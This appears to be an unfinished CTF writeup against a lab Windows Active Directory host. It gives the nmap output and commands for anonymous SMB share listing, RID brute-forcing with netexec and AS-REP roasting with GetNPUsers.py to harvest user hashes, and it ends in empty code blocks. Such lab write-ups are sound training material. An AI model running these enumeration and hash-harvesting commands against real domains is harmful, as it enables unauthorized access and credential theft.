# CTF Writeup: Ledger

---

## Reconaissance

An initial service version detection scan revealed the following information:

```
nmap -n -Pn -sSCV -p- 10.10.210.195
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-24 17:28 CEST
Nmap scan report for 10.10.210.195
Host is up (0.042s latency).
Not shown: 65505 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-24 15:29:47Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-24T15:30:52+00:00; +2s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:labyrinth.thm.local, DNS:thm.local, DNS:THM
| Not valid before: 2023-05-12T07:32:36
|_Not valid after:  2024-05-11T07:32:36
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| tls-alpn: 
|_  http/1.1
|_http-title: IIS Windows Server
|_ssl-date: 2025-09-24T15:30:52+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=thm-LABYRINTH-CA
| Not valid before: 2023-05-12T07:26:00
|_Not valid after:  2028-05-12T07:35:59
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:labyrinth.thm.local, DNS:thm.local, DNS:THM
| Not valid before: 2023-05-12T07:32:36
|_Not valid after:  2024-05-11T07:32:36
|_ssl-date: 2025-09-24T15:30:52+00:00; +2s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-24T15:30:52+00:00; +2s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:labyrinth.thm.local, DNS:thm.local, DNS:THM
| Not valid before: 2023-05-12T07:32:36
|_Not valid after:  2024-05-11T07:32:36
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-24T15:30:52+00:00; +2s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:labyrinth.thm.local, DNS:thm.local, DNS:THM
| Not valid before: 2023-05-12T07:32:36
|_Not valid after:  2024-05-11T07:32:36
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-09-24T15:30:52+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Not valid before: 2025-09-23T15:20:48
|_Not valid after:  2026-03-25T15:20:48
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
49772/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: LABYRINTH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb2-time: 
|   date: 2025-09-24T15:30:44
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 155.39 seconds
```

Decided to proceed with enumerating shares with anonymous access and it worked.

```
smbclient -L \\\\10.10.210.195\\

Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.210.195 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Mapped 10.10.210.195 in /etc/hosts to domains

```
echo "10.10.210.195 thm.local thm.local0 labyrinth.thm.local" | sudo tee -a /etc/hosts
10.10.210.195 thm.local thm.local0 labyrinth.thm.local
```

Performing user enumeration on domain utilizing netexec with guest creds.

```
nxc smb 'labyrinth.thm.local' -u 'guest' -p '' --rid-brute
```

Retrieved a lot of user accounts, created a wordlist out of them and filtered out useless input. So we can use the wordlist to potentially bruteforce or enumerate credentials.


```
cat users | cut -d '\' -f2 | cut -d ' ' -f1
```

Performed ASREP-Roasting and utilized GetNPUsers.py, retrieved a lot of Hashes from users.

```
/usr/share/doc/python3-impacket/examples/GetNPUsers.py thm.local/ -no-pass -usersfile users
```

Saved hashes individually and tried to enumerate a password out of those with john the ripper, but couldn't retrieve any credentials.


```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```


```

```



```

```


```

```
